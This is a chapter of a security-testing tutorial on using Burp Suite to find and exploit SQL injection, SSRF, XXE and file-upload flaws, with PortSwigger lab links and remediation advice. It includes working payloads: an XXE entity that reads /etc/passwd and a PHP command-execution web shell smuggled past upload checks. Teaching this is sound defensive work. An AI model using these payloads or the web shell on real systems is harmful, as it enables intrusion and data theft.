# 12. Vulnerability Testing & Exploitation with Burp Suite

> 🌐 **Language / اللغة:** [النسخة العربية (`ar/12-vulnerabilities-with-burp.md`)](../ar/12-vulnerabilities-with-burp.md)

---

## 🎯 Chapter Objectives

Orchestrate the diverse modules of Burp Suite into an integrated offensive toolkit to systematically discover, verify, and exploit critical vulnerability classes defined in the **OWASP Top 10**, focusing on **Cross-Site Scripting (XSS)**, **SQL Injection**, **Server-Side Request Forgery (SSRF)**, **XML External Entity (XXE) Injection**, **File Upload Bypasses**, and **Insecure Deserialization**.

---

## 🔍 Technical Explanation

### 1. SQL Injection Probing in Repeater:
SQLi manifests when user-controlled input concatenates directly into dynamic relational database queries without parameterized binding. In Repeater, exploitation proceeds through structured phases:
* Syntax boundary breaking via single quotes `'` or double quotes `"`, observing HTTP `500` status codes or verbose error traces.
* Projection schema mapping via `UNION SELECT NULL,NULL...` to ascertain column numbers and data type compatibility.
* Time-based differential validation (e.g., `pg_sleep(10)` or `WAITFOR DELAY '0:0:10'`), monitoring server response latency in Repeater's telemetry header.

### 2. SSRF Identification with Burp Collaborator:
Occurs when an application server is coerced into executing arbitrary outbound requests against internal or cloud metadata services (e.g., AWS IMDSv1 at `http://169.254.169.254`):
* Blind SSRF vectors (in image processors, PDF generators, or webhooks) are validated by injecting unique **Burp Collaborator** subdomains and monitoring out-of-band DNS/HTTP interactions.

### 3. XML External Entity (XXE) Injection:
Exploits legacy or misconfigured XML parsers that process untrusted Document Type Definitions (DTDs):
* Direct file exfiltration (`file:///etc/passwd` or `file:///C:/windows/win.ini`).
* Out-of-band XXE exfiltration by forcing the parser to fetch an external malicious DTD hosted on Burp Collaborator, leaking internal files over DNS or HTTP parameters.

### 4. File Upload Verification & Filter Evasion:
Repeater dismantles arbitrary file upload filters across multiple defense layers:
* Tampering with MIME headers (`Content-Type: image/jpeg` wrapping executable PHP scripts).
* Extension masquerading using alternative extensions (`.phtml`, `.php5`) or null-byte/path manipulation (`shell.php%00.jpg`).
* Injecting file signatures (Magic Bytes like `GIF89a;`) into script headers to defeat naive file inspection routines.

---

## 🛠️ Step-by-Step Hands-On Guide

### Exercise 1: Exploiting XXE to Exfiltrate `/etc/passwd`
1. Intercept an XML-based endpoint in Proxy (e.g., a stock check API: `POST /product/stock`) and send it to **Repeater** (`Ctrl + R`).
2. Observe the baseline XML body:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <stockCheck><productId>381</productId><storeId>1</storeId></stockCheck>
   ```
3. Inject an external entity declaration inside a custom DOCTYPE header, referencing it within the XML element:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
   ```
4. Click **Send**; observe the contents of the target server's `/etc/passwd` file returned directly in the response body.

### Exercise 2: Bypassing File Upload Content-Type Checks to Deliver a Web Shell
1. Intercept an avatar upload request (`POST /my-account/avatar`) and route it to **Repeater**.
2. Mutate the filename parameter in the multipart header to `shell.php`.
3. Retain a benign `Content-Type` header: `Content-Type: image/jpeg`.
4. Prepend valid GIF Magic Bytes above a lightweight PHP command execution payload:
   ```http
   GIF89a;
   <?php echo system($_GET['cmd']); ?>
   ```
5. Click **Send**; upon confirmation of storage, navigate to `/files/avatars/shell.php?cmd=id` to confirm remote code execution.

---

## 🧪 Recommended Labs

* **Interactive Lab:** [PortSwigger Academy: Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
  * Practice crafting custom XML entities in Repeater to retrieve sensitive local system files.

---

## ⚔️ Attacker vs. 🛡️ Defender Perspective

* **⚔️ Attacker Perspective:**
  * Attackers use Repeater to perform precision parameter tampering, bypassing browser assumptions and testing edge cases that automated security tools fail to construct.
* **🛡️ Defender Perspective:**
  * Remediation mandates defense-in-depth: enforcing Parameterized Queries for SQLi, completely disabling XML external entity processing (`disable-dtd`), and storing uploaded user files on detached, non-executable object storage (e.g., AWS S3).

---

## ❌ Common Beginner Mistakes

> [!WARNING]
> 1. **Omitting URL-encoding in GET payloads:** Failing to URL-encode characters like `+`, spaces, or `#` in URL parameters, which causes web servers to misparse the payload.
> 2. **Testing XXE on hardened parsers without OOB fallbacks:** Wasting hours expecting in-band text returns when modern parsers suppress verbose errors, missing blind XXE channels that require Collaborator.
> 3. **Corrupting Multipart Boundary Strings:** Manually editing raw file upload bodies in Repeater and accidentally deleting multipart boundary hashes, causing the application server to drop the request with bad framing errors.

---

## 📚 References

1. [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)
2. [PortSwigger Web Security Academy Research Catalog](https://portswigger.net/web-security)
3. [PayloadsAllTheThings GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

| [← Previous: 11. Extensions & Montoya API](./11-extensions.md) | [TOC](../README.en.md#🗂️-table-of-contents-english-version---en) | [Next: 13. Authentication, JWT & OAuth →](./13-auth-session-jwt-oauth.md) |
